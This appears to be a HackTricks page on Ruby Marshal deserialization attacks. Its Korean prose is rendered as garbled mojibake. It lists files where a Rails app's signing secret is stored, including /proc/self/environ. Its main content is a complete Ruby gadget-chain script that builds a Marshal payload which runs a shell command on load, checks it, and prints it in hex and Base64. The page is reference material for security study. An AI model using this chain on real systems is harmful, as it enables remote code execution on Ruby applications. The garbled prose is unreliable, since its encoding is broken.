ë£¨ë¹„ì—ì„œëŠ” **marshal** ë¼ì´ë¸ŒëŸ¬ë¦¬ ë‚´ì˜ ë‘ ê°€ì§€ ë©”ì„œë“œë¥¼ í†µí•´ ì§ë ¬í™”ê°€ ì´ë£¨ì–´ì§‘ë‹ˆë‹¤. ì²« ë²ˆì§¸ ë©”ì„œë“œì¸ **dump**ëŠ” ê°ì²´ë¥¼ ë°”ì´íŠ¸ ìŠ¤íŠ¸ë¦¼ìœ¼ë¡œ ë³€í™˜í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤. ì´ ê³¼ì •ì„ ì§ë ¬í™”ë¼ê³  í•©ë‹ˆë‹¤. ë°˜ëŒ€ë¡œ, ë‘ ë²ˆì§¸ ë©”ì„œë“œì¸ **load**ëŠ” ë°”ì´íŠ¸ ìŠ¤íŠ¸ë¦¼ì„ ê°ì²´ë¡œ ë˜ëŒë¦¬ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤. ì´ ê³¼ì •ì„ ì—­ì§ë ¬í™”ë¼ê³  í•©ë‹ˆë‹¤.

ì§ë ¬í™”ëœ ê°ì²´ë¥¼ ë³´í˜¸í•˜ê¸° ìœ„í•´ **ë£¨ë¹„ëŠ” HMAC (Hash-Based Message Authentication Code)**ë¥¼ ì‚¬ìš©í•˜ì—¬ ë°ì´í„°ì˜ ë¬´ê²°ì„±ê³¼ ì‹ ë¢°ì„±ì„ ë³´ì¥í•©ë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ ì‚¬ìš©ë˜ëŠ” í‚¤ëŠ” ë‹¤ìŒê³¼ ê°™ì€ ì—¬ëŸ¬ ìœ„ì¹˜ ì¤‘ í•˜ë‚˜ì— ì €ì¥ë©ë‹ˆë‹¤:

- `config/environment.rb`
- `config/initializers/secret_token.rb`
- `config/secrets.yml`
- `/proc/self/environ`

**ë£¨ë¹„ 2.X ì¼ë°˜ ì—­ì§ë ¬í™”ì—ì„œ RCE ê°€ì ¯ ì²´ì¸ (ìì„¸í•œ ë‚´ìš©ì€ [https://www.elttam.com/blog/ruby-deserialization/](https://www.elttam.com/blog/ruby-deserialization/) ì°¸ì¡°)**:
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
ë£¨ë¹„ ì˜¨ ë ˆì¼ì¦ˆë¥¼ ì•…ìš©í•˜ê¸° ìœ„í•œ ë‹¤ë¥¸ RCE ì²´ì¸: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
